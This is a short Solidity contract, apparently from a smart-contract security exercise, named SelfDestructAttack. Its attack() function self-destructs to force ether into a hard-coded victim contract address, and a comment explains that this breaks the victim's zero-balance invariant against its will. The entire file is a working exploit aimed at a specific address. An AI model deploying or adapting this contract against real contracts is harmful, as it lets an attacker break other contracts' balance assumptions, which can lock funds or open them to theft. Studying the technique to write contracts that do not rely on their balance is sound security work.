// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract SelfDestructAttack {
    // force the victim contract to receive ether by self-destructing and sending ether to it, which will make the victim contract's balance greater than 0 against their will/invariant
    address internal immutable victim = 0x46F1fC1a4C79a254537803d8ba984E396408e0b3;
    function attack() public payable {
        selfdestruct(payable(victim));
    }
}